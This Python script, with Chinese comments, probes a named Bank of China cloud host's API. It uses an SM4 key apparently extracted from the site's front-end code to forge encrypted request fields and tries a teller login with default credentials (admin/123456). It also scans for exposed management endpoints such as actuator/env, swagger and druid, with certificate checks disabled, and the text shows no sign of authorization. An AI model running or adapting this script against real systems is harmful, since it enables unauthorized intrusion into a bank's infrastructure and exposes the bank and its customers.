#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""深度漏洞测试 - 测试不走SGP转发的关键API端点"""
import json, ssl, random, time, binascii
import urllib.request, urllib.error
from gmssl import sm4

# === 配置 ===
BASE_URL = "https://dl.brcloud.bankofchina.com/dlydjd"
K_E = "714b674e6c796245574d48652b39773d"  # 从前端JS提取的SM4加密密钥
DEFAULT_AUTH = "987654321"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def send_request(url_path, data=None, method="POST", desc=""):
    """发送HTTP请求"""
    url = f"{BASE_URL}/{url_path}"
    headers = {
        "Content-Type": "application/json",
        "Authorization": DEFAULT_AUTH,
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    }
    
    body = None
    if data is not None:
        body = json.dumps(data).encode('utf-8')
    
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    
    print(f"\n{'='*60}")
    print(f"[{desc}] {method} {url}")
    if data is not None:
        print(f"  请求体: {json.dumps(data, ensure_ascii=False)[:300]}")
    
    try:
        start = time.time()
        resp = urllib.request.urlopen(req, context=ctx, timeout=20)
        duration = round(time.time() - start, 2)
        status = resp.getcode()
        resp_body = resp.read().decode('utf-8', errors='replace')
        resp_headers = dict(resp.headers)
        
        print(f"  HTTP {status} | Time: {duration}s | Size: {len(resp_body)}")
        print(f"  Server: {resp_headers.get('Server', 'N/A')}")
        
        # 尝试解析JSON
        try:
            resp_json = json.loads(resp_body)
            ret_code = resp_json.get("Header", {}).get("RetCode", "")
            ret_msg = resp_json.get("Header", {}).get("RetMsg", "")
            print(f"  RetCode: {ret_code} | RetMsg: {ret_msg}")
            
            if ret_code == "000000":
                print(f"  >>> SUCCESS! 响应数据:")
                print(f"  {json.dumps(resp_json, ensure_ascii=False, indent=2)[:1000]}")
                return resp_json
            else:
                print(f"  响应: {json.dumps(resp_json, ensure_ascii=False)[:500]}")
        except:
            print(f"  响应(非JSON): {resp_body[:500]}")
        
        return resp_body
    except urllib.error.HTTPError as e:
        duration = round(time.time() - start, 2)
        body = e.read().decode('utf-8', errors='replace')
        print(f"  HTTP {e.code} | Time: {duration}s")
        print(f"  响应: {body[:500]}")
        return body
    except Exception as e:
        print(f"  错误: {e}")
        return None

def sm4_encrypt(data_str, key_hex=K_E):
    """SM4 ECB加密"""
    key = binascii.unhexlify(key_hex)
    crypt = sm4.CryptSM4()
    crypt.set_key(key, sm4.SM4_ENCRYPT)
    encrypted = crypt.crypt_ecb(data_str.encode('utf-8'))
    return encrypted.hex()

# === Part 1: 测试 isApiUseEncryptionList ===
print("\n" + "=" * 60)
print("=== Part 1: 测试 isApiUseEncryptionList (获取加密API列表) ===")
print("=" * 60)

# 构造标准请求头
header = {
    "CurrentPageNum": 1, "PageTotalNum": 10, "NoRetCode": True,
    "BranchId": "800000", "LegalRepCode": "10000", "TranTeller": "",
    "TranCode": "CUST-INFO/isApiUseEncryptionList", "TranDate": "20260716",
    "TranTime": "004500000", "ServiceName": "isApiUseEncryptionList",
    "ServiceCode": "D20190130", "AuthFlag": "0", "AuthrTellerNo": "1",
    "Channel": "39", "ConsumerId": "1", "GlobalSeq": "1", "GlobalSeqNo": "1",
    "KeyId": "1", "LocalLang": "1", "Mac": "1", "SourceSysId": "1111",
    "TerminalCode": "1121", "TranSeq": "1", "TranSeqNo": "1",
    "TranTellerNo": "1", "ExtendContent": "1", "TotalNum": "0"
}

# 测试不同的URL格式
for url_path in ["gateway/admin/isApiUseEncryptionList", "sgp/isApiUseEncryptionList"]:
    send_request(url_path, {"Header": header}, "POST", f"isApiUseEncryptionList via {url_path}")

# 通过SGP转发测试
send_request("sgp/transferRequest", {
    "Header": {**header, "TranCode": "CUST-INFO/isApiUseEncryptionList", "ServiceName": "isApiUseEncryptionList"}
}, "POST", "isApiUseEncryptionList via SGP")

# === Part 2: 测试 buildNonceToken (用K_E加密) ===
print("\n" + "=" * 60)
print("=== Part 2: 测试 buildNonceToken (用K_E加密验证密钥) ===")
print("=" * 60)

# 构造加密数据: 数字_数字 格式
num1 = 7 * (random.randint(500, 999))
num2 = 13 * (random.randint(500, 799))
plain_data = f"{num1}_{num2}"
encrypted_data = sm4_encrypt(plain_data)
print(f"  明文: {plain_data}")
print(f"  K_E: {K_E}")
print(f"  SM4加密: {encrypted_data}")

# 测试buildNonceToken
for url_path in ["gateway/admin/buildNonceToken", "sgp/buildNonceToken"]:
    send_request(url_path, {
        "Header": {**header, "TranCode": "CUST-INFO/buildNonceToken", "ServiceName": "buildNonceToken"},
        "data": encrypted_data
    }, "POST", f"buildNonceToken via {url_path}")

# 通过SGP转发测试
send_request("sgp/transferRequest", {
    "Header": {**header, "TranCode": "CUST-INFO/buildNonceToken", "ServiceName": "buildNonceToken"},
    "data": encrypted_data
}, "POST", "buildNonceToken via SGP")

# === Part 3: 测试 sgpTellerLogin.auth 登录接口 ===
print("\n" + "=" * 60)
print("=== Part 3: 测试 sgpTellerLogin.auth 登录接口 ===")
print("=" * 60)

# 测试空登录请求
for url_path in ["sgp/sgpTellerLogin.auth", "sgp/sgpTellerLogin"]:
    send_request(url_path, {
        "Header": {**header, "TranCode": "test-Login", "ServiceName": "sgpTellerLogin"}
    }, "POST", f"sgpTellerLogin via {url_path}")

# 测试带参数的登录请求
send_request("sgp/sgpTellerLogin.auth", {
    "Header": {**header, "TranCode": "test-Login", "ServiceName": "sgpTellerLogin"},
    "tellerId": "admin",
    "password": "123456",
    "deviceId": "test"
}, "POST", "sgpTellerLogin with creds")

# === Part 4: 测试 sgpTellerLogout.auth ===
print("\n" + "=" * 60)
print("=== Part 4: 测试 sgpTellerLogout.auth ===")
print("=" * 60)
send_request("sgp/sgpTellerLogout.auth", {
    "Header": {**header, "TranCode": "test-Logout", "ServiceName": "sgpTellerLogout"}
}, "POST", "sgpTellerLogout")

# === Part 5: 测试 queryVerificationCode ===
print("\n" + "=" * 60)
print("=== Part 5: 测试 queryVerificationCode ===")
print("=" * 60)
send_request("sgp/queryVerificationCode.auth", {
    "Header": {**header, "TranCode": "test-queryVerificationCode", "ServiceName": "queryVerificationCode"}
}, "POST", "queryVerificationCode")

# === Part 6: 测试 initUserKeyGroup (密钥协商) ===
print("\n" + "=" * 60)
print("=== Part 6: 测试 initUserKeyGroup (密钥协商) ===")
print("=" * 60)

# 构造DH密钥协商请求
# modeType = SM4加密("modp1")
mode_type = sm4_encrypt("modp1")
# appId = SM4加密("sfs01003001303031")
app_id = sm4_encrypt("sfs01003001303031")
# openId = SM4加密(随机nonce)
nonce = f"s{int(time.time()*1000)}{random.randint(100000, 999999)}"
open_id = sm4_encrypt(nonce)
# AppOpenId = SM4加密("sfs01003001303031_nonce")
app_open_id = sm4_encrypt(f"sfs01003001303031_{nonce}")

print(f"  modeType (modp1加密): {mode_type}")
print(f"  appId (sfs01003001303031加密): {app_id}")
print(f"  openId ({nonce}加密): {open_id}")
print(f"  AppOpenId: {app_open_id}")

# 测试initUserKeyGroup
for url_path in ["gateway/admin/initUserKeyGroup", "sgp/initUserKeyGroup"]:
    send_request(url_path, {
        "Header": {**header, "TranCode": "CUST-INFO/initUserKeyGroup", "ServiceName": "initUserKeyGroup"},
        "negotiateValue": "",  # DH公钥（客户端生成的）
        "modeType": mode_type,
        "appId": app_id,
        "openId": open_id
    }, "POST", f"initUserKeyGroup via {url_path}")

# 通过SGP转发测试
send_request("sgp/transferRequest", {
    "Header": {**header, "TranCode": "CUST-INFO/initUserKeyGroup", "ServiceName": "initUserKeyGroup"},
    "negotiateValue": "",
    "modeType": mode_type,
    "appId": app_id,
    "openId": open_id
}, "POST", "initUserKeyGroup via SGP")

# === Part 7: 测试直接访问的URL路径 ===
print("\n" + "=" * 60)
print("=== Part 7: 测试其他直接访问路径 ===")
print("=" * 60)

paths_to_test = [
    "gateway/admin/",
    "gateway/",
    "admin/",
    "sgp/",
    "actuator",
    "actuator/health",
    "actuator/env",
    "actuator/beans",
    "actuator/mappings",
    "actuator/configprops",
    "swagger-ui.html",
    "v2/api-docs",
    "swagger-resources",
    "druid/",
    "druid/index.html",
]

for path in paths_to_test:
    try:
        url = f"https://dl.brcloud.bankofchina.com/dlydjd/{path}"
        req = urllib.request.Request(url, headers={
            "Authorization": DEFAULT_AUTH,
            "User-Agent": "Mozilla/5.0"
        })
        resp = urllib.request.urlopen(req, context=ctx, timeout=10)
        body = resp.read().decode('utf-8', errors='replace')
        if resp.getcode() == 200 and len(body) > 0 and not body.startswith("<!DOCTYPE"):
            print(f"\n  [FOUND] /{path} => HTTP {resp.getcode()} | Size: {len(body)}")
            print(f"  内容: {body[:300]}")
    except urllib.error.HTTPError as e:
        if e.code != 404 and e.code != 403:
            body = e.read().decode('utf-8', errors='replace')
            if body and not body.startswith("<!DOCTYPE"):
                print(f"\n  [INTERESTING] /{path} => HTTP {e.code}")
                print(f"  内容: {body[:200]}")
    except:
        pass

print("\n=== 全部测试完成 ===")
